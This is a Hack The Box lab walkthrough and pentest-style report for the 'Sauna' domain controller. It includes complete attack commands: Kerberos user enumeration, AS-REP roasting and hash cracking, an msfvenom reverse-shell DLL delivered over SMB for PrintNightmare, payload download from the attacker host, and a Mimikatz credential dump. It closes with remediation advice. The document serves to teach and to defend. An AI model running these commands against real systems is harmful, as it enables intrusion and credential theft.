---
title: Sauna - Walkthrough & Report
date: 02-16-2026
tags:
  - HTB
  - Windows
  - Easy
  - AD
---
![[Sauna_machine_image.png]]
# 🎯 Summary
This walkthrough for the **Sauna** HTB machine demonstrates why reconnaissance is the foundation of a successful foothold. Focused on **Active Directory**, it provides hands-on with **OSINT**, User enumeration through **Kerberos** service and **ASREPRoasting** to abuse users Ticket Granting Ticket (TGT). 

A key highlight of this walkthrough is the **alternative exploitation path** discovered during my  penetration test in "Adventure Mode". While the official Hack The Box path suggests a different route for privilege escalation, I leveraged the well-known **PrintNightmare (CVE-2021-1675/CVE-2021-34527)** vulnerability to escalate privileges directly to **SYSTEM**. The chain concludes with the retrieval of the Domain Controller's Administrator password to ensure long-term persistence.

The following tools were utilized to compromise the machine from initial access to root:
- [**Nmap:**](https://nmap.org) Services Discovery 
- **[NetExec](https://www.netexec.wiki/) / [Smbclient:](https://linux.die.net/man/1/smbclient)**:SMB Share Discovery and Interaction
- [**Username-anarchy:**](https://github.com/urbanadventurer/username-anarchy) Custom Word-list Creation 
- [**Kerbrute:**](https://github.com/ropnop/kerbrute) Domain Users Enumeration
- **[Impacket GetNPUsers:](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py)** AS-REP Roasting Attack
- [**Hashcat:**](https://hashcat.net/hashcat/)Ticket Granting Ticket (TGT) and NTLM hash Cracking
- [**Evil-WinRM:**](https://github.com/Hackplayers/evil-winrm) Remote access on the host
- [**CVE-2021-1675.py:**](https://github.com/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py) PrintNightmare Exploit Tool
- [**Metasploit:** ](https://www.metasploit.com/)System Hash Dumping

# 🔍 Reconnaissance
As always the first step is to scan the target host to enumerate the **externally exposed service** utilizing the `Nmap` tool:
```
$ nmap -Pn -n -p- -A 10.129.95.180 -oA Scans/sauna
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-16 14:48 +0100
Nmap scan report for 10.129.95.180
Host is up (0.019s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-16 20:51:21Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
<SNIP>
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-02-16T20:52:16
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: 6h59m59s

TRACEROUTE (using port 139/tcp)
HOP RTT      ADDRESS
1   18.61 ms 10.10.14.1
2   19.23 ms 10.129.95.180

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 251.74 seconds
```

The `Nmap` scan output shows port **80(HTTP**), ports **88, 464 (Kerberos)**, ports **139, 445  (SMB)** and ports **389, 636, 3268 (LDAP)** as open; we can consider them as a possible **vectors** for our foothold.
Another valuable piece of information obtained is that the host is a **Domain Controller (DC)** and the underlying running OS is identified as **Microsoft Windows 2019**.

Having a web server on port 80 we start to verify the presence of any **login portal** or **vulnerable form** to abuse to obtain a foothold:
![[Website_homepage.png|1300]]

Manually browsing did not provide useful results so we proceed to utilize `ffuf` to execute a **directory brute-force attack** to locate possible **hidden or unlinked** sensitive folders and .html pages:
```
$ ffuf -u http://10.129.95.180/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories.txt -ic -t 80 -ac -o Scans/ffuf_webroot_scan -e .html

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.95.180/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories.txt
 :: Extensions       : .html 
 :: Output file      : Scans/ffuf_webroot_scan
 :: File format      : json
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 80
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

css                     [Status: 301, Size: 148, Words: 9, Lines: 2, Duration: 19ms]
images                  [Status: 301, Size: 151, Words: 9, Lines: 2, Duration: 22ms]
contact.html            [Status: 200, Size: 15634, Words: 7370, Lines: 326, Duration: 31ms]
blog.html               [Status: 200, Size: 24695, Words: 11588, Lines: 471, Duration: 28ms]
about.html              [Status: 200, Size: 30954, Words: 14043, Lines: 641, Duration: 24ms]
Images                  [Status: 301, Size: 151, Words: 9, Lines: 2, Duration: 20ms]
index.html              [Status: 200, Size: 32797, Words: 15329, Lines: 684, Duration: 19ms]
fonts                   [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 22ms]
<SNIP>

:: Progress: [40230/40230] :: Job [1/1] :: 3636 req/sec :: Duration: [0:00:15] :: Errors: 0 ::
```

The output of the scan shows folders with access restricted (**301 code**) and a list of pages already discovered during the manual browsing of the web site.
Continuing with the target DC enumeration, we verify utilizing `smbclient` if we have visibility on SMB share folders as an **anonymous user**:
```
$ smbclient -NL //10.129.95.180/                         
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.95.180 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

The permissions on the SMB service were set correctly by the domain admin so no folder was visibile as an **unauthenticated user**. The next step is to verify if querying **LDAP anonymously** returns a domain users list:
```
$ ./windapsearch.py --dc-ip 10.129.95.180 -u "" -U                                                                        
[+] No username provided. Will try anonymous bind.
[+] Using Domain Controller at: 10.129.95.180
[+] Getting defaultNamingContext from Root DSE
[+]     Found: DC=EGOTISTICAL-BANK,DC=LOCAL
[+] Attempting bind
[+]     ...success! Binded as: 
[+]      None

[+] Enumerating all AD users

[*] Bye!
```

The output of the Python script demonstrates that also the LDAP service was **securely configured**.
It is clear now that we have to focus on the web site exposed on port 80. 
To discover the presence of possible subdomain we query the **DNS service**, exposed at port 53, looking for records that reveal a clue about our next step; the `dig` command can be used for this task:
```
$ dig any  @10.129.95.180 EGOTISTICAL-BANK.LOCAL                                                                                                                                

<SNIP>

;; ANSWER SECTION:
EGOTISTICAL-BANK.LOCAL. 600     IN      A       10.10.10.175
EGOTISTICAL-BANK.LOCAL. 3600    IN      NS      sauna.EGOTISTICAL-BANK.LOCAL.
EGOTISTICAL-BANK.LOCAL. 3600    IN      SOA     sauna.EGOTISTICAL-BANK.LOCAL. hostmaster.EGOTISTICAL-BANK.LOCAL. 50 900 600 86400 3600
EGOTISTICAL-BANK.LOCAL. 600     IN      AAAA    dead:beef::d82a:5af8:762a:f639

;; ADDITIONAL SECTION:
sauna.EGOTISTICAL-BANK.LOCAL. 3600 IN   A       10.129.95.180
sauna.EGOTISTICAL-BANK.LOCAL. 3600 IN   AAAA    dead:beef::a9
sauna.EGOTISTICAL-BANK.LOCAL. 3600 IN   AAAA    dead:beef::4451:758b:489d:1fcd

;; Query time: 20 msec
;; SERVER: 10.129.95.180#53(10.129.95.180) (TCP)
;; WHEN: Mon Feb 16 15:16:24 CET 2026
;; MSG SIZE  rcvd: 234

```

We see that the web site is registered as "**sauna.EGOTISTICAL-BANK.LOCAL**" so we added it to our "/etc/hosts" file to create the route to it.
To proceed we browse the web page using the **Fully Qualified Domain Name (FQDN)** insted of the IP address, **intercepting** the HTTP request with `Burp Suite`,  to be able to verify if the FQDN corresponds to a virtual host (vHost) or a subdomain:
![[Burp_vhost_confirmation.png]]

`Burp` shows that the FQDN is a vHost so we proceed to execute a **vHost enumeration** with `ffuf` looking for a different web application that could lead to a foothold:
```
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://sauna.egotistical-bank.local -H 'Host: FUZZ.egotistical-bank.local' -ic -t 80 -mc all -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://sauna.egotistical-bank.local
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.egotistical-bank.local
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 80
 :: Matcher          : Response status: all
________________________________________________

:: Progress: [114438/114438] :: Job [1/1] :: 459 req/sec :: Duration: [0:00:53] :: Errors: 0 ::
```

The `ffuf` scan output returning zero matches lead us to **retrace our steps** and go back to enumerating target DC starting again from the web site pages content.
A more careful examination of the "**about.html**" page provided us with **company employee details**:
![[Possible_username_about_page.png|1300]]

This information alone is not utilizable considering that each company can decide to implement a different format to create the domain user account names.
To be able to perform the user enumeration, firstly we need to **create a word-list** starting from a simple .list file where we put all the found names and then utilize the `username-anarchy` tool to transform them using the **"flast" format**, once standard company choice:
```
$ nano utenti.list                 
$ cat utenti.list                              
Fergus Smith 
Shaun Coins 
Sophie Driver 
Bowie Taylor
Hugo Bear 
Steven Kerb

$ ./username-anarchy --input-file utenti.list --select-format flast > usersflast.txt
```

Having the word-list ready we pass it to the `Kerbrute` tool using its "userenum" function to identify a possible **valid domain usernames**:
```
$ ./kerbrute userenum -d EGOTISTICAL-BANK.LOCAL --dc 10.129.95.180 ./usersflast.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 02/16/26 - Ronnie Flathers @ropnop

2026/02/16 15:45:46 >  Using KDC(s):
2026/02/16 15:45:46 >   10.129.95.180:88

2026/02/16 15:45:51 >  [+] VALID USERNAME:       fsmith@EGOTISTICAL-BANK.LOCAL
2026/02/16 15:45:51 >  Done! Tested 6 usernames (1 valid) in 5.041 seconds
```

# ⚔️ Exploitation
Scan results returned that **fsmith** is a valid domain username but we don't have any clue about the account's password; `Kerbrute` has also the "bruteuser" function that permit to **brute-force the password** providing a word-list as a source:
```
$ ./kerbrute bruteuser -d EGOTISTICAL-BANK.LOCAL --dc 10.129.95.180 /usr/share/wordlists/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-10000.txt fsmith@EGOTISTICAL-BANK.LOCAL 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 02/16/26 - Ronnie Flathers @ropnop

2026/02/16 15:58:59 >  Using KDC(s):
2026/02/16 15:58:59 >   10.129.95.180:88

2026/02/16 15:59:30 >  Done! Tested 10000 logins (0 successes) in 30.423 seconds

```

Brute-forcing unfortunately was **unsuccessful** so we decide to verify if the fsmith account is configured having **Kerberos pre-authentication disabled**.
To do this operation we put the fsmith account in a file name "users.list" and pass it to the `impacket-GetNPUsers` tool to request in `Hashcat` format  and save in a file its **Ticket Granting Ticket (TGT)**, encrypted with **user's NTLM** password:
```
$ impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/ -dc-ip 10.129.95.180 -no-pass -usersfile users.list -format hashcat -outputfile hsmith_ticket
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL@EGOTISTICAL-BANK.LOCAL:4146aec479969f8054c54beb0e808317$f8709b4e754b09e59xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx2a6e5557ebdf3015b670f9c4fe38b9e4b10d3491509a48aaa77e7be4da0eace5bd5c0ba0ae147ea417d55180c693556966b29a513390a3xxxxxxxxxxxxxxxxxxxxxx19eec6c79eca2eaa6adf7abce4470567bee024ffa0d4f44f622d3c429f45b4aaff7fe1f3e31b56982ec82f889959136xxxxxxxx96bad6e2e5ecd43415ee9ee0e8cd6e67b93041086d0a6076f66cd1ce3a08b0463xxxxxxxxxxxxxxxxxxxxxxxxxx3bcfb36918c65306f775c90811d65358afdfa1793b673b50cba1575xxxxxx836d4311afecdac1e7866511743058fd176ec3cf28bd722b505781xxxxxx9569ba909caeb149
```

Since the fsmith account has the **UF_DONT_REQUIRE_PREAUTH** flag set, we obtained his TGT and parsed it **offline** with `Hashcat` to take advantage of the GPU processor and **speedup** the task:
```
$ hashcat -m 18200 hsmith_ticket /usr/share/wordlists/rockyou.txt.gz -D 1,2 
hashcat (v7.1.2) starting

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt.gz
* Passwords.: 14344385
* Bytes.....: 53357329
* Keyspace..: 14344385

$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL@EGOTISTICAL-BANK.LOCAL:4146aec479969f8054c54beb0e808317$f8709b4e754b09e59xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx2a6e5557ebdf3015b670f9c4fe38b9e4b10d3491509a48aaa77e7be4da0eace5bd5c0ba0ae147ea417d55180c693556966b29a513390a3xxxxxxxxxxxxxxxxxxxxxx19eec6c79eca2eaa6adf7abce4470567bee024ffa0d4f44f622d3c429f45b4aaff7fe1f3e31b56982ec82f889959136xxxxxxxx96bad6e2e5ecd43415ee9ee0e8cd6e67b93041086d0a6076f66cd1ce3a08b0463xxxxxxxxxxxxxxxxxxxxxxxxxx3bcfb36918c65306f775c90811d65358afdfa1793b673b50cba1575xxxxxx836d4311afecdac1e7866511743058fd176ec3cf28bd722b505781xxxxxx9569ba909caeb149:Thxxxxxxxx23
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL@EGOTIST...aeb149
Time.Started.....: Mon Feb 16 16:12:38 2026 (3 secs)
Time.Estimated...: Mon Feb 16 16:12:41 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt.gz)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  2701.2 kH/s (12.28ms) @ Accel:569 Loops:1 Thr:32 Vec:1
Speed.#03........:  1507.1 kH/s (2.30ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Speed.#*.........:  4208.3 kH/s
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10645472/14344385 (74.21%)
Rejected.........: 0/10645472 (0.00%)
Restore.Point....: 10456128/14344385 (72.89%)
<SNIP>

Started: Mon Feb 16 16:12:07 2026
Stopped: Mon Feb 16 16:12:42 2026
```

Cracking operation was **successful** and the clear text value of the fsmith password was retrieved in about **35 seconds**.
**Having a foothold** in the domain we utilize the `Evil-WinRM` tool to obtain a PowerShell shell on the Domain Controller and start our post-exploitation phase:
```
evil-winrm -i 10.129.95.180 -u "fsmith@EGOTISTICAL-BANK.LOCAL" -p 'Thxxxxxxxx23'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\FSmith\Documents> hostname
SAUNA
*Evil-WinRM* PS C:\Users\FSmith\Documents> whoami
egotisticalbank\fsmith
```

# 🚩 Post-Exploitation
Our focus now is to find the user-level proof of access "**user.txt**" to obtain our first flag of the machine.
Expecting to find it under the user's Desktop folder, we move at "C:\Users\FSmith\Desktop" path, confirm the presence of **user.txt** and reveal its content:
```
*Evil-WinRM* PS C:\Users\FSmith\Documents> cd ..
*Evil-WinRM* PS C:\Users\FSmith> cd Desktop
*Evil-WinRM* PS C:\Users\FSmith\Desktop> dir


    Directory: C:\Users\FSmith\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        2/16/2026  12:46 PM             34 user.txt


*Evil-WinRM* PS C:\Users\FSmith\Desktop> type user.txt
3eb3xxxxxxxxxxxxxxxxxxxxxxxx0703
```

Completed the first objective of the machine, we move our focus to obtain **administrator privileges** on the Domain Controller host.
We take advantage of the fsmith credentials to enumerate any **READ or WRITE privileges** associated to a SMB share folder using the `NetExec` tool:
```
$ nxc smb 10.129.95.180 -u "fsmith"  -p 'Thxxxxxxxx23' --shares --log Logging\ output/smb_shares_fsmit.log 
SMB         10.129.95.180   445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False) 
SMB         10.129.95.180   445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thxxxxxxxx23 
SMB         10.129.95.180   445    SAUNA            [*] Enumerated shares
SMB         10.129.95.180   445    SAUNA            Share           Permissions     Remark
SMB         10.129.95.180   445    SAUNA            -----           -----------     ------
SMB         10.129.95.180   445    SAUNA            ADMIN$                          Remote Admin
SMB         10.129.95.180   445    SAUNA            C$                              Default share
SMB         10.129.95.180   445    SAUNA            IPC$            READ            Remote IPC
SMB         10.129.95.180   445    SAUNA            NETLOGON        READ            Logon server share 
SMB         10.129.95.180   445    SAUNA            print$          READ            Printer Drivers
SMB         10.129.95.180   445    SAUNA            RICOH Aficio SP 8300DN PCL 6 WRITE           We cant print money
SMB         10.129.95.180   445    SAUNA            SYSVOL          READ            Logon server share
```

Utilizing a valid domain user the tool output shows a total of seven (7) shared folders where we have READ privileges on four (4) of them and WRITE privileges only on one (1).
The presence of the "**print$**" and "**Ricoh Aficio**" folders associated to the **build 17763** of the Windows Server 2019 OS running on the DC, leads us to consider the possibility to execute the **PrintNightmare (CVE-2021-1675/CVE-2021-34527)** exploit to obtain a Meterpreter shell as **NT AUTHORITY\SYSTEM** in case the **Print Spooler** service is active.
To verify this condition on the DC, we proceed to active a python web server to permit the download of the needed tool on the target DC:
```
$ python3 -m http.server 8000                            
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

With the web server ready we connect back to the DC through `Evil-WinRM` to download the "Get-SpoolStatus.ps1" PowerShell script from our testing host, import it in the PowerShell session and execute the "**Get-SpoolStatus**" command to obtain the Print Spool service status:
```
$ evil-winrm -i 10.129.95.180  -u "fsmith@EGOTISTICAL-BANK.LOCAL"  -p 'Thxxxxxxxx23'               
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\FSmith\Documents> wget http://10.10.14.188:8000/Get-SpoolStatus.ps1 -O Get-SpoolStatus.ps1
*Evil-WinRM* PS C:\Users\FSmith\Documents> import-module .\Get-SpoolStatus.ps1
*Evil-WinRM* PS C:\Users\FSmith\Documents> Get-SpoolStatus -ComputerName SAUNA
SAUNA True
```

The "**True**" in the output confirms that the **service is active** and that we can proceed with the next phases of our exploit.
More preparation is needed to obtain the **Metepreter reverse shell** as NT AUTHORITY\SYSTEM and it starts with the creation of the **payload DLL file** utilizing `MSFVenom`, a tool of the Metasploit packet:
```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.188 LPORT=4443 -f dll > Printscript.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of dll file: 9216 bytes
```

With the payload ready we proceed to activate in the payload's folder an **SMB server** which purpose is to serve the "**Printscript.dll**" file during the final exploit phase:
```
$ sudo impacket-smbserver  -smb2support share ./
[sudo] password di luca: 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
```

To receive the **Meterpreter reverse shell** on our  testing host we need to configure and run the multi/handler module providing LHOST, LPORT and payload options to guarantee full shell compatibility:
```
$ msfconsole -q  
msf > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set LHOST 10.10.14.188
LHOST => 10.10.14.188
msf exploit(multi/handler) > set LPORT 4443
LPORT => 4443
msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp

msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.14.188:4443 
```

Having **completed all the prerequisites** steps, it is time to execute the exploit itself utilizing the `CVE-2021-1675.py` Python script providing as attributes the user credentials, DC IP address and our SMB path:
```
$ sudo python3 CVE-2021-1675.py EGOTISTICAL-BANK.LOCAL/fsmith:Thxxxxxxxx23@10.129.95.180 '\\10.10.14.188\share\Printscript.dll'
[*] Connecting to ncacn_np:10.129.95.180[\PIPE\spoolss]
[+] Bind OK
[+] pDriverPath Found C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_9543832f82bb474f\Amd64\UNIDRV.DLL
[*] Executing \??\UNC\10.10.14.188\share\Printscript.dll
[*] Try 1...
[*] Stage0: 0
[*] Try 2...
[*] Stage0: 0
[*] Try 3...
<SNIP>
```

The **exploit succeeded** and we can see in the `MSFConsole` multi/handler session that we obtained a **Meterpreter shell as NT AUTHORITY\SYSTEM**:
```
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.14.188:4443 
[*] Sending stage (230982 bytes) to 10.129.95.180
[*] Meterpreter session 1 opened (10.10.14.188:4443 -> 10.129.95.180:50066) at 2026-02-16 16:59:50 +0100

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : SAUNA
OS              : Windows Server 2019 (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : EGOTISTICALBANK
Logged On Users : 8
Meterpreter     : x64/windows
```

Obtained **SYSTEM access** to the DC we are able to explore all the files on the file system and retrieve the root-level proof of access (**root.txt**) under the path "C:\Users\Administrator\Desktop" revealing its content:
```
meterpreter > cd "C:\Users\Administrator\Desktop"
meterpreter > cat root.txt
098axxxxxxxxxxxxxxxxxxxxxxxx04be
```

To ensure **long-term persistence** we proceed to **dump users hashes** for the DC memory through the Meterpreter session loading the "kiwi" extension, a Metasploit integrated version of the `Mimikatz` tool:
```
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
meterpreter > lsa_dump_sam
[+] Running as SYSTEM
[*] Dumping SAM
Domain : SAUNA
SysKey : 6d261a4763682dbf58336ec3dc7ff268
Local SID : S-1-5-21-2957739120-1979133213-3197504660

SAMKey : fab1bd20c8ad95bd038e1359e8338847

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 7facxxxxxxxxxxxxxxxxxxxxxxxxc04f

RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
```

The tool dumps the DC's **Administrator NTLM hash** giving us the opportunity to try to crack it **offline** with `Hashcat` to obtain its clear text value and guarantee persistence in the DC host:
```
$ hashcat -m 1000 '7facxxxxxxxxxxxxxxxxxxxxxxxxc04f' /usr/share/wordlists/rockyou.txt.gz -D 1,2
hashcat (v7.1.2) starting

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt.gz
* Passwords.: 14344385
* Bytes.....: 53357329
* Keyspace..: 14344385

7facxxxxxxxxxxxxxxxxxxxxxxxxc04f:<Redacted>               
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1000 (NTLM)
Hash.Target......: 7facxxxxxxxxxxxxxxxxxxxxxxxxc04f
Time.Started.....: Mon Feb 16 18:20:09 2026 (0 secs)
Time.Estimated...: Mon Feb 16 18:20:09 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt.gz)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........: 17721.4 kH/s (5.51ms) @ Accel:1024 Loops:1 Thr:64 Vec:1
Speed.#03........:  3168.6 kH/s (0.31ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Speed.#*.........: 20890.0 kH/s
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 450560/14344385 (3.14%)
Rejected.........: 0/450560 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
<SNIP>

Started: Mon Feb 16 18:20:06 2026
Stopped: Mon Feb 16 18:20:10 2026
```

The cracking of the hash is **successful** providing us with **persistence** in the Windows domain.

# 🛠️ Remediation

### 1. Insecure Account Configuration (AS-REP Roasting)
- **Pre-Authentication Enforcement:** Audit the Active Directory environment for accounts with the `DONT_REQ_PREAUTH` flag enabled and ensure that "Do not require Kerberos preauthentication" is unchecked in the account settings.
- **Credential Rotation:** Immediately rotate the passwords for any identified accounts (such as `fsmith`), as the previous NTLM hashes should be considered compromised through offline cracking.
- **Least Privilege:** Implement a "Least Privilege" model by ensuring that standard user accounts are not granted administrative rights or specialized permissions unless strictly necessary for their job function.

### 2. Print Spooler Vulnerability (PrintNightmare)
- **Service Deactivation:** Disable the **Print Spooler** service on all Domain Controllers and critical infrastructure where printing capabilities are not required using the command: `Stop-Service -Name Spooler -Force; Set-Service -Name Spooler -StartupType Disabled`.
- **Security Patching:** Verify the installation of [Microsoft KB5005010](https://support.microsoft.com/en-us/topic/kb5005010) and subsequent cumulative updates to address CVE-2021-1675 and CVE-2021-34527.
- **Registry Hardening:** Use Group Policy to set the `NoWarningNoElevationOnInstall` and `UpdatePromptSettings` registry keys to `0` to prevent the installation of unauthorized or malicious printer drivers via Point and Print.

### 3. Active Directory Persistence & Credential Hygiene
- **Tiered Administration:** Implement [Microsoft's Tiered Administration Model](https://learn.microsoft.com/en-us/security/compass/privileged-access-access-model) to ensure that high-privileged credentials (like the Domain Administrator) are never used or cached on lower-tier assets.
- **DCSync Prevention:** Monitor for and restrict the `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` permissions to authorized Domain Controllers and designated backup accounts only.
- **Managed Identities:** Transition legacy service accounts to [Group Managed Service Accounts (gMSAs)](https://learn.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview), which feature 120-character passwords that are automatically managed and rotated by the domain system.

> [!CAUTION] Penetration Test Report (PDF)
> Please send me a message on [Linkedin](https://www.linkedin.com/in/luca-albertazzi-77073b61)to obtain PDF report link.



